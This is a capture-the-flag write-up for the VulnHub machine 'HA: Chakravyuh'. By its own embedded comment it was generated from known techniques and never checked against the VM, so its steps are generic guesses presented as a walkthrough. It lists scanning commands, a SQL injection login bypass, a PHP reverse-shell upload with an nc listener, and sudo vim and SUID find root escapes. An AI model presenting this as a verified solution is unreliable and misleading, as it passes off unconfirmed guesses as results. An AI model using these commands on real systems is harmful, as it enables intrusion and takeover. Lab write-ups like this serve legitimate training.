# HA: Chakravyuh — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.X (host-only) |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Root Flag** | `/root/flag.txt` |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/ha-chakravyuh,388/) |

<!-- generated from known techniques; verify against live VM -->

## Attack Summary

nmap → gobuster (web) → username hint → SQL injection / credential bypass → SSH → SUID/sudo misconfiguration → root

## Methodology

1. Network discovery and port scanning
2. Web enumeration — directory brute force
3. Credential extraction via login bypass or SQLi
4. SSH access
5. Privilege escalation via SUID or sudo

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Typical open ports: 22 (SSH), 80 (HTTP), possibly 8080.

---

## Step 2: Web Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
nikto -h http://<TARGET_IP>/
```

Look for login panels, admin pages, or exposed config files.

---

## Step 3: Credential Discovery

Browse the web application. The HA: Chakravyuh machine (Mahabharat theme) hides credentials or usernames in web content or robots.txt. Try:

```bash
curl http://<TARGET_IP>/robots.txt
curl http://<TARGET_IP>/index.php
```

Common attack vectors for this machine:
- SQL injection on login form: `' OR 1=1-- -`
- Password hinted in page source or a downloadable file
- HTTP Basic Auth bypass

```bash
# SQLi login test
sqlmap -u "http://<TARGET_IP>/login.php" --data="user=admin&pass=test" --dbs
```

---

## Step 4: Shell Access

Once credentials are found, SSH in or use a web shell if RCE is available:

```bash
ssh <user>@<TARGET_IP>
```

Or via web upload / PHP shell if a file upload exists:

```bash
# PHP reverse shell
nc -nvlp 4444
curl -X POST http://<TARGET_IP>/upload.php -F "file=@shell.php"
```

---

## Step 5: Privilege Escalation

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

Common privesc on HA series:
- `sudo <binary>` without password → GTFOBins
- Writable cron script
- SUID `find`, `vim`, `nmap`

```bash
# Example: sudo vim privesc
sudo vim -c ':!/bin/bash'

# Example: SUID find
find / -exec /bin/bash -p \; -quit
```

---

## Step 6: Root Flag

```bash
id && whoami
cat /root/flag.txt
```

---

## Lessons Learned

1. **Web content enumeration** often exposes usernames or password hints in CTF machines
2. **SQL injection** on login forms remains a primary attack vector when input is not sanitized
3. **sudo misconfigurations** on common binaries provide trivial root escalation
4. **SUID binaries** should be audited and minimized — check GTFOBins for known bypass techniques

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| SQL injection | Use prepared statements / parameterized queries |
| Weak credentials | Enforce strong password policy; disable default accounts |
| Unrestricted sudo | Restrict sudo to specific, necessary commands |
| SUID on interactive binaries | Remove SUID bit: `chmod u-s /usr/bin/<binary>` |
